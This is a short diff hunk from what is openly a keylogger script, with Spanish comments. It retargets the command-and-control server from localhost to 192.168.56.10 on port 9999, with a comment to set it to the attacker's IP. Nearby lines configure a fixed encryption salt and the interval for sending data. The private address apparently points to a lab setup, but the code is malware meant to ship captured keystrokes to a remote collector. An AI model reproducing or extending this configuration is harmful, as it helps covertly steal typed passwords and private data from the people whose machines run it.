@@ -72,7 +72,7 @@ SALT = b"proyect0_keylogger_salt_v1"        # sal fija (conocida por atacante y 
 KEY_ITERATIONS = 200_000                    # iteraciones PBKDF2 para dificultar fuerza bruta
 
 # Servidor C2 - ajustar a la IP/puerto del servidor receptor
-C2_HOST = "127.0.0.1"   # <-- cambiar a la IP del atacante
+C2_HOST = "192.168.56.10"   # <-- cambiar a la IP del atacante
 C2_PORT = 9999
 
 # Intervalo de envío en segundos (configurable por argumento --interval)
